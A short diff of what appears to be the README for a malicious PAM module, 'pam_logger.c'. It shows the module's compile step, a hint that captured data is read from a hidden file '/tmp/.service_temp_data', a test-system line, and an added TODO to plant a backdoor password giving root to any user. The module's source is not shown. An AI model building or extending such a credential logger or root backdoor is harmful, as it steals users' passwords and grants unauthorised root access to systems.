@@ -1,4 +1,8 @@
 
+Tested on:
+Linux WORK-ubuntu-dev 6.11.0-21-generic #21~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb 24 16:52:15 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+
+---
 
 ```bash
 gcc -fPIC -c pam_logger.c
@@ -18,5 +22,7 @@ localuser@WORK-ubuntu-dev:~$ sudo cat /tmp/.service_temp_data
 
 ---
 
-Tested on:
-Linux WORK-ubuntu-dev 6.11.0-21-generic #21~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon Feb 24 16:52:15 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+TODO:
+- Add backdoor password that gives root access for any user supplied.
+
+
